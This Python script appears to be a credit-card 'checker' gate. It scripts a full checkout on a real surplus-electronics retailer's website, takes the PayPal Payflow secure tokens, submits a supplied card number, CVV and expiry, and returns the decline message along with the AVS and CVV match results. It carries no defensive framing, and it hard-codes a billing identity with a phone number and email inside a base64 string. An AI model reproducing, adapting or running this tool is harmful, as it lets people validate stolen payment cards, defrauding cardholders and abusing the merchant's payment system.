import aiohttp, asyncio, base64, time
from bs4 import BeautifulSoup

async def PayflowAVS(cc, mes, ano, cvv):

    session = aiohttp.ClientSession()
    # ////! -------------- Request Number 1 -------------- ////    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'es-419,es;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.surplussales.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.surplussales.com/cgi-bin/cart.pl',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'name': '(FRI) 4400B1477',
        'custom1': 'Lockheed Conductive Woven Shielding Gasket',
        'price': '15:1:12:3',
        'return': '/RF/RFConductiveGasket.html',
        'buy.x': '52',
        'buy.y': '15',
        'add': '1',
    }
    req1 = await session.post('https://www.surplussales.com/cgi-bin/cart.pl', headers=headers, data=data)
    r1 = await req1.text()
    print("req 1 passed")
    # ////! -------------- Request Number 2 -------------- ////  
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.6',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'text/plain',
    'Origin': 'https://www.surplussales.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.surplussales.com/GuestTools/shoppingcart.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
        'TYPE': 'SC',
        'IDNO': 'ITEM_0000QOFH',
        'QTY': '2',
    }
    req2 = await session.post(
        'https://www.surplussales.com/guesttools.rookiecart.itemqtyupdate',
        headers=headers,
        data=data,
    )
    r2 = await req2.text()
    print("req 2 passed")
    # ////! -------------- Request Number 3 -------------- ////
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.6',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'text/plain',
    'Origin': 'https://www.surplussales.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.surplussales.com/GuestTools/checkout.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
        'COUNTRYID': '00000000',
    }
    req3 = await session.post(
        'https://www.surplussales.com/guesttools.rookiecart.shipaddr',
        headers=headers,
        data=data,
    )
    r3 = await req3.text()

    decode = r3.split('"checkout":"')[1].split('"')[0]
    add = base64.b64decode(decode).decode('utf-8')
    addresid = add.split('id="AddressID" value="')[1].split('"')[0]
    print("req 3 passed")
    # ////! -------------- Request Number 4 -------------- ////
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.6',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'text/plain',
    'Origin': 'https://www.surplussales.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.surplussales.com/GuestTools/checkout.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = 'ADDR=[TkFNRT1NYXJjb3MgU2FsJkNPTVBOQU1FPSZQUklBRERSPU5ldyBZb3JrJlNFQ0FERFI9JkNJVFk9TmV3IFlvcmsmU1RBVEU9JlNUQVRFSUQ9MDAwMDAwMTImWklQPTEwMDgwJkNPVU5UUllJRD0wMDAwMDAwMCZQSE9ORT04Mjk4MDcwMjQwJkVNQUlMPWJlYmVtYXJjb3N3MTJAZ21haWwuY29tJk5PVEVTPSZTSElQTUVUSElEPTAwMDAwMDAwJkFERFJTQU1FPVlFUw==]&ADDRID='+addresid

    req4 = await session.post(
        'https://www.surplussales.com/guesttools.rookiecart.billaddr',
        headers=headers,
        data=data,
    )
    r4 = await req4.text()
    print("req 4 passed")
    # ////! -------------- Request Number 5 -------------- ////
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.6',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'text/plain',
    'Origin': 'https://www.surplussales.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.surplussales.com/GuestTools/checkout.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
    data = 'PAYMETHOD=Secure Online Credit Card Transaction&PAYTEST=N'

    req5 = await session.post(
        'https://www.surplussales.com/guesttools.rookiecart.paymethod',
        headers=headers,
        data=data,
    )
    r5 = await req5.text()
    print("req 5 passed")

    decodificar = r5.split('"checkout":"')[1].split('"')[0]
    pay = base64.b64decode(decodificar).decode('utf-8')
    cartid = pay.split('name="CartID" value="')[1].split('"')[0]
    payid = pay.split('name="PayID" value="')[1].split('"')[0]
    shopid = pay.split('name="ShopperID" value="')[1].split('"')[0]
    tokenid = pay.split('name="TokenID" value="')[1].split('"')[0]
    # ////! -------------- Request Number 6 -------------- ////
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.6',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'text/plain',
    'Origin': 'https://www.surplussales.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.surplussales.com/GuestTools/checkout.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
        'CHECKTOKEN': 'Y',
        'CARTID': cartid,
        'PAYID': payid,
        'SHOPID': shopid,
        'TOKENID': tokenid,
        'PAYTEST': 'N',
    }
    req6 = await session.post(
    'https://www.surplussales.com/guesttools.rookiecart.paymethod',
    headers=headers,
    data=data,
)
    r6 = await req6.text()
    print("req 6 passed")
    # ////! -------------- Request Number 7 -------------- ////
    time.sleep(5)

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.6',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'text/plain',
    'Origin': 'https://www.surplussales.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.surplussales.com/GuestTools/checkout.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
        'CHECKTOKEN': 'Y',
        'CARTID': cartid,
        'PAYID': payid,
        'SHOPID': shopid,
        'TOKENID': tokenid,
        'PAYTEST': 'N',
    }

    req7 = await session.post(
        'https://www.surplussales.com/guesttools.rookiecart.paymethod',
        headers=headers,
        data=data,
    ) 
    r7 = await req7.text()

    decodificar = r7.split('"checkout":"')[1].split('"')[0]
    xd = base64.b64decode(decodificar).decode('utf-8')
    securetoken = xd.split('<INPUT TYPE=hidden NAME="SECURETOKEN" VALUE="')[1].split('"')[0]
    securetokenid = xd.split('<INPUT TYPE=hidden NAME="SECURETOKENID" VALUE="')[1].split('"')[0]

    if len(ano) == 4:
        ano = ano[2:]
        print("req 7 passed")
    # ////! -------------- Request Number 8 -------------- ////
    
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'es-419,es;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.surplussales.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.surplussales.com/',
    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
}

    data = {
        'SECURETOKEN': securetoken,
        'SECURETOKENID': securetokenid,
        'BILLTOFIRSTNAME': 'Marcos',
        'BILLTOLASTNAME': 'Sal',
        'CARDNUM': cc,
        'CVV2': cvv,
        'EXPMONTH': mes,
        'EXPYEAR': ano,
    }
    req8 = await session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
    r8 = await req8.text()
    soup = BeautifulSoup(r8, 'lxml')
    if int(r8.find('name="PROCCVV2"')) > 0:
        AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
        PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
        RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
        await session.close()
        response = f'{RESPMSG} - AVS: {AVSDATA} - CVV: {PROCCVV2}'
        return response
    elif int(r8.find('name="RESPMSG"')) > 0:
        RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
        await session.close()
        return RESPMSG
    else:
        await session.close()
        print(r8)
        return "Error In Response. ⚠️"



        
